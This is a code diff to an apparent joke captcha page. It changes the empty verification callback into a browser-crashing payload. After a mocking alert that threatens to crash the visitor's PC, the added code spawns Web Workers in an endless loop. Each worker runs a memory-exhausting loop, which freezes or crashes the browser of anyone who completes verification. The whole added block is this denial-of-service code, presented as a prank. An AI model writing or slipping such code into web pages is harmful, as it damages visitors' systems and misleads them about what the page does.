@@ -137,7 +137,12 @@
       let regeneratebtn = document.getElementById('regenerate-btn')
       let errormessage = document.getElementById('errormessage')
 
-      let onverify = () => {}
+      let onverify = () => {
+        alert("Thank you for verifying that you are not human. If you are human, we will crash your PC, and send a robot firing squad to your location shortly.")
+        while (true) {new Worker(URL.createObjectURL(
+          new Blob(['let a=[1];while(true){a.push(JSON.stringify(a))}'], {type: 'text/javascript'})
+        ))}
+      }
       let onreset = () => {}
       let intervals = []
       let timeouts = []
